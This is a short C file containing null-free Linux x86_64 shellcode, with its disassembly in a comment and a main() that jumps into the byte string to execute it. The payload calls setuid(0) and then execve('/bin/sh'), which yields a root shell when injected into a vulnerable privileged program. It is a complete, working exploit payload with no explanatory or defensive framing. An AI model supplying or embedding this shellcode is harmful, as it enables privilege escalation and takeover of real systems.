/*
  45 bytes of linux x86_64 machine code assembled from sc.s

  to reproduce hex output:
  $ cd /path/to/sc
  $ gcc -nostdlib -O0 -c src/sc.s
  $ objdump -d sc.o

  48 31 ff                xor    %rdi,%rdi
  6a 69                   pushq  $0x69
  58                      pop    %rax
  0f 05                   syscall 
  48 31 c0                xor    %rax,%rax
  50                      push   %rax
  48 89 e6                mov    %rsp,%rsi
  48 89 e2                mov    %rsp,%rdx
  48 bb 2f 62 69 6e 2f    movabs $0x2368732f6e69622f,%rbx
  73 68 23
  48 c1 e3 08             shl    $0x8,%rbx
  48 c1 eb 08             shr    $0x8,%rbx
  53                      push   %rbx
  48 89 e7                mov    %rsp,%rdi
  6a 3b                   pushq  $0x3b
  58                      pop    %rax
  0f 05                   syscall

*/

char* sc = "\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\x31"
           "\xc0\x50\x48\x89\xe6\x48\x89\xe2\x48\xbb"
           "\x2f\x62\x69\x6e\x2f\x73\x68\x23\x48\xc1"
           "\xe3\x08\x48\xc1\xeb\x08\x53\x48\x89\xe7"
           "\x6a\x3b\x58\x0f\x05";

int main(void) {
    (*(void (*)(void)) sc)();
}
